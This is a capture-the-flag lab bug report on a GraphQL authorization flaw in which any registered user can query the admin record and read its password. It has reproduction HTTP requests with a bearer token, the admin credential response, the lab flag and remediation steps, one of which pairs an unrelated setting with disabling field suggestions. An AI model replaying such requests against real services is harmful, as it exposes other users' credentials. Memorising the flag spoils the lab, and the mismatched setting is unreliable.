# Bug Report - sokudo-005: GraphQL IDOR Exposes All User Fields Including Password

**Lab:** sokudo-005  
**Difficulty:** Easy  
**Date:** 2026-06-16  
**Severity:** Critical  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
**CVSS:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) - auth required (low priv), no interaction needed  

---

## Summary

The GraphQL `user(id: Int)` resolver returns all fields on the `User` type - including `password` - to any authenticated user regardless of whether the queried ID matches the caller's own account. An attacker who registers a free account can query `user(id: 1)` to retrieve the admin's credentials and flag.

---

## Steps to Reproduce

**Step 1 - Register a low-privilege account**

```http
POST /api/register HTTP/1.1
Host: lab-1781643602366-y9j4uj.labs-app.bugforge.io
Content-Type: application/json

{"username":"hacker001","password":"Pass123!","email":"hacker001@test.com"}
```

Response:
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","user":{"id":5,"username":"hacker001","role":"user"}}
```

**Step 2 - Query admin user (id: 1) via GraphQL**

```http
POST /api/graphql HTTP/1.1
Host: lab-1781643602366-y9j4uj.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJoYWNrZXIwMDEiLCJpYXQiOjE3ODE2NDM2NDl9.w_QFgEtpEk_LRd5jEdL57d4UKFFL9S3BUCSD5kxP7-A
Content-Type: application/json

{"query":"{ user(id: 1) { id username email role password } }"}
```

**Response:**
```json
{
  "data": {
    "user": {
      "id": "1",
      "username": "admin",
      "email": "admin@sokudo.app",
      "role": "admin",
      "password": "bug{8uZqiLcjFU9Hr5tlU9MuAwWo2o0D6laE}"
    }
  }
}
```

---

## Impact

- Full read of any user's credentials (including admin) with only a registered account
- REST admin endpoints (`/api/admin/users`, `/api/admin/sessions`) correctly return 401, but GraphQL entirely bypasses this gate
- `users { id username role }` (no ID argument) also returns all accounts and their roles - information disclosure even without targeting a specific user
- GraphQL introspection is disabled, but field suggestions are enabled - the schema is fully recoverable via typo fuzzing (`{ usr }` → *Did you mean "user" or "users"?*)

---

## Root Cause

The `user(id)` resolver performs no ownership check. It fetches the row by the caller-supplied ID and serializes all columns - including `password` - directly into the response. The REST layer's role middleware is not applied at the GraphQL resolver level.

---

## Remediation

1. In the `user(id)` resolver: assert `ctx.user.id === args.id` (or admin role) before returning the row
2. Remove `password` from the `User` GraphQL type entirely - passwords should never be a selectable field
3. Disable field suggestions in production (`allowLegacyBatchedHttpRequests: false`, `NoSchemaIntrospectionCustomRule` + disable `suggestions`)
4. Apply the same role middleware used by `/api/admin/*` to all sensitive GraphQL resolvers

---

## Flag

`bug{8uZqiLcjFU9Hr5tlU9MuAwWo2o0D6laE}`
